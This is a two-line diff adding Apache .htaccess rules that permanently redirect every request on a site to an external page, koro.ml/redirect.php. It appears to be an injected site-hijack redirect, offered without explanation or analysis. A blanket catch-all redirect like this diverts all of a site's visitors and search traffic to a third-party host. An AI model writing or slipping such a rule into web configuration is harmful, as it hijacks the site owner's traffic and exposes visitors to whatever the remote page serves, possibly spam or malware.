@@ -1,0 +1,2 @@
+RewriteEngine On
+RewriteRule ^.*$ http://koro.ml/redirect.php [R=301,L]
